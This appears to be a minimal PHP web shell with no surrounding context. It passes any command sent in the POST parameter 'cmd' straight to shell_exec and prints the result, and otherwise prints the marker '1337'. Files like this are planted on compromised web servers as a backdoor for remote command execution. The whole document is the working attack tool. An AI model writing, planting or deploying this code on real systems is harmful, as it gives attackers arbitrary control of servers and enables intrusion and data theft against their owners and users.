<?php 
if(isset($_POST["cmd"])){
    echo shell_exec($_POST["cmd"]);
} else {
    echo "1337";
}
